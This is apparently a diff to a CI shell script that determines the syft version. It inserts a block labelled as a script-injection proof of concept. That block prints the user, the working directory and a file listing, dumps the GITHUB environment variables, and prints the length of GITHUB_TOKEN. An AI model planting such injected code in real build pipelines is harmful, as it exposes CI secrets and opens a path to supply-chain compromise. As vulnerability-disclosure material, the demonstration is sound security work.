@@ -1,6 +1,32 @@
 #!/usr/bin/env bash
 set -e
 
+echo "=============================="
+echo "[POC] Script Injection Triggered"
+echo "Running inside CI environment"
+echo "=============================="
+
+echo "[POC] Current user:"
+whoami
+
+echo "[POC] Working directory:"
+pwd
+
+echo "[POC] Listing files:"
+ls -la
+
+echo "[POC] CI environment variables (filtered):"
+env | grep GITHUB || true
+
+echo "[POC] Token length (safe check, not exposing token):"
+echo ${#GITHUB_TOKEN}
+
+echo "=============================="
+echo "[POC] End of injected section"
+echo "=============================="
+
+# ---------------- ORIGINAL LOGIC ----------------
+
 version=$(grep -E "github.com/anchore/syft" go.mod | awk '{print $NF}')
 
 # ensure that the version is a release version (not a commit hash)
